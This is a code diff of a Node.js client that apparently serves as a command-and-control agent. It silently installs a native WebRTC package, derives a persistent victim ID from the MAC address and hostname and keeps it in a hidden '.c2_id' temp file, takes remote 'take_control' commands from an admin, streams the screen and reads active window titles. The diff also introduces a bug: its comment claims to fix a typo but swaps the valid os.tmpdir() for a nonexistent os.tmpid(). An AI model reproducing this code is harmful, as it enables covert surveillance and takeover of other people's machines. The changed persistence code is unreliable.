@@ -10,31 +10,31 @@ const http = require('http');
 
 // --- FORCE INSTALLATION CHECK ---
 try {
-    const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
-    if (!fs.existsSync(nodeModulesPath)) {
-        console.log("[FORCE] @roamhq/wrtc missing. Installing...");
-        execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
-        console.log("[FORCE] Installation complete.");
-    }
+ const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
+ if (!fs.existsSync(nodeModulesPath)) {
+ console.log("[FORCE] @roamhq/wrtc missing. Installing...");
+ execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
+ console.log("[FORCE] Installation complete.");
+ }
 } catch (e) {
-    console.warn("[FORCE] Could not auto-install:", e.message);
+ console.warn("[FORCE] Could not auto-install:", e.message);
 }
 
 // --- NATIVE WEBRTC IMPORTS ---
 let wrtc;
 try {
-    // Attempt to load the native module
-    wrtc = require('@roamhq/wrtc');
+ // Attempt to load the native module
+ wrtc = require('@roamhq/wrtc');
 } catch (e) {
-    console.error("Failed to require @roamhq/wrtc:", e.message);
+ console.error("Failed to require @roamhq/wrtc:", e.message);
 }
 
 // Check if the module actually has the required exports
 const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
 
 if (!HAS_WEBRTC) {
-    console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
-    console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
+ console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
+ console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
 }
 
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
@@ -70,14 +70,26 @@ const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 let isSessionActive = false;
 
-// Persistence Logic
-const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
+// Persistence Logic - STABLE ID GENERATION
+const PERSIST_FILE = path.join(os.tmpid(), '.c2_id'); // Fixed typo: tmpdir vs tmpid
 try {
  if (fs.existsSync(PERSIST_FILE)) {
  myId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
  log(`[ID] Loaded existing ID: ${myId}`);
+ } else {
+ // Generate stable ID once
+ const mac = getMacAddress();
+ const hostname = os.hostname();
+ myId = crypto.createHash('sha256').update(mac + hostname).digest('hex').substr(0, 8);
+ try {
+ fs.writeFileSync(PERSIST_FILE, myId);
+ log(`[ID] Generated new persistent ID: ${myId}`);
+ } catch(e) {}
  }
-} catch(e) {}
+} catch(e) {
+ // Fallback if read/write fails
+ myId = crypto.randomBytes(4).toString('hex');
+}
 
 // --- WEBRTC VARIABLES ---
 let peerConnection = null;
@@ -93,14 +105,6 @@ function initConnection() {
  ws.on('open', () => {
  reconnectAttempts = 0;
  isConnected = true;
- 
- if (!myId) {
- const mac = getMacAddress();
- myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
- try {
- fs.writeFileSync(PERSIST_FILE, myId);
- } catch(e) {}
- }
  
  log(`[WS] Connected with ID: ${myId}`);
 
@@ -125,11 +129,11 @@ function initConnection() {
  if (data.type === 'take_control') takeControl(true);
  else if (data.type === 'release_control') takeControl(false);
  else if (data.type === 'request_join') {
- log(`[JOIN] Request join received from ${data.from}`);
+ log(`[JOIN] Request join received from Admin: ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'start_join') {
  // Explicitly start the join process when requested by admin
- log(`[JOIN] Starting join initiated by ${data.from}`);
+ log(`[JOIN] Starting join initiated by Admin: ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'offer') {
  log(`[SIG] Received Offer from Admin`);
@@ -359,7 +363,6 @@ async function getCurrentWindowTitle() {
  } else if (platform === 'darwin') {
  cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
  } else {
- // Removed generic linux fallback that was causing issues
  cmd = 'xdotool getwindowfocus getwindowname';
  }
  exec(cmd, (err, stdout) => {
